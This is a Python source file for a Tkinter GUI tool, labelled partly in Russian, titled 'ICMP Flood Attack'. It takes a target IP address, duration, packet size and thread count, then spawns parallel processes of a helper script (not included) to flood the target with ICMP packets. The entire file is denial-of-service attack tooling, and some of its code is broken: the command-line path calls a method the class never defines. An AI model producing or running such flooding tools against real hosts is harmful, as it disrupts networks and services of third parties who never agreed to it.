import subprocess
import threading
import tkinter as tk
from tkinter import ttk
from ctypes.wintypes import tagRECT
import socket
import struct
import sys
import time
import argparse

class ICMPFloodAttack:
    def __init__(self):
        self.stop_event = threading.Event()
        self.process_list = []
        self.threads = []
        self.timeout_timer = None

    def send_ping(self, ip_dest, duration, packet_size):
        end_time = time.time() + duration
        while not self.stop_event.is_set() and time.time() < end_time:
            process = subprocess.Popen(
                ['python', '_internal/icmp_flood_args.py', '-target', ip_dest, '-duration', str(duration), '-size', str(packet_size)],
                stdout=subprocess.DEVNULL
            )
            self.process_list.append(process)
            process.wait(timeout=duration)

        self.stop_attack()

    def start_attack(self):
        global ip_entry, duration_entry, size_entry, threads_entry, status_label, start_button

        ip_destination = ip_entry.get()
        duration = int(duration_entry.get())
        sent_buff_size = int(size_entry.get())
        num_threads = int(threads_entry.get())

        # Инициализация значений
        self.stop_event.clear()
        self.process_list = []
        self.threads = []

        for _ in range(num_threads):
            thread = threading.Thread(target=self.send_ping, args=(ip_destination, duration, sent_buff_size))
            self.threads.append(thread)
            thread.start()

        # Инициализация таймера
        self.timeout_timer = threading.Timer(duration, self.stop_attack)
        self.timeout_timer.start()

        status_label.config(text='Running...')
        start_button.config(text='Остановить атаку', command=self.stop_attack, state=tk.NORMAL)

    def stop_attack(self):
        if self.timeout_timer and self.timeout_timer.is_alive():
            self.timeout_timer.cancel()  # Остановка таймера
        self.stop_event.set()
        for process in self.process_list:
            try:
                process.terminate()
            except ProcessLookupError:
                # Обработка исключений
                pass
        status_label.config(text='Attack stopped.')
        start_button.config(text='Запустить атаку', command=self.start_attack, state=tk.NORMAL)

    def main(self):
        global ip_entry, duration_entry, size_entry, threads_entry, status_label, start_button

        root = tk.Tk()
        root.title("ICMP Flood Attack")

        frame = ttk.Frame(root, padding="10")
        frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        ttk.Label(frame, text="IP-адрес атакуемого хоста:").grid(column=0, row=0, sticky=tk.W)
        ip_entry = ttk.Entry(frame, width=15)
        ip_entry.grid(column=1, row=0, sticky=tk.W)

        ttk.Label(frame, text="Продолжительность атаки (с):").grid(column=0, row=1, sticky=tk.W)
        duration_entry = ttk.Entry(frame, width=15)
        duration_entry.grid(column=1, row=1, sticky=tk.W)

        ttk.Label(frame, text="Размер пакета (байт):").grid(column=0, row=2, sticky=tk.W)
        size_entry = ttk.Entry(frame, width=15)
        size_entry.grid(column=1, row=2, sticky=tk.W)

        ttk.Label(frame, text="Количество потоков:").grid(column=0, row=3, sticky=tk.W)
        threads_entry = ttk.Entry(frame, width=15)
        threads_entry.grid(column=1, row=3, sticky=tk.W)

        start_button = ttk.Button(frame, text='Запустить атаку', command=self.start_attack)
        start_button.grid(column=0, row=4, columnspan=2, pady=10)

        status_label = ttk.Label(frame, text='')
        status_label.grid(column=0, row=6, columnspan=2)

        root.mainloop()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="ICMP Request Generator")
    parser.add_argument("-target", type=str, help="Target IP address")
    parser.add_argument("-duration", type=int, default=1, help="Timeout in seconds (default: 1)")
    parser.add_argument("-size", type=int, default=64, help="Timeout in seconds (default: 1)")

    args = parser.parse_args()

    target_ip = args.target
    duration = args.duration
    packet_size = args.size

    icmp_flood_attack = ICMPFloodAttack()

    if target_ip:
        icmp_flood_attack.icmp_flood(target_ip, duration, packet_size)
    else:
        icmp_flood_attack.main()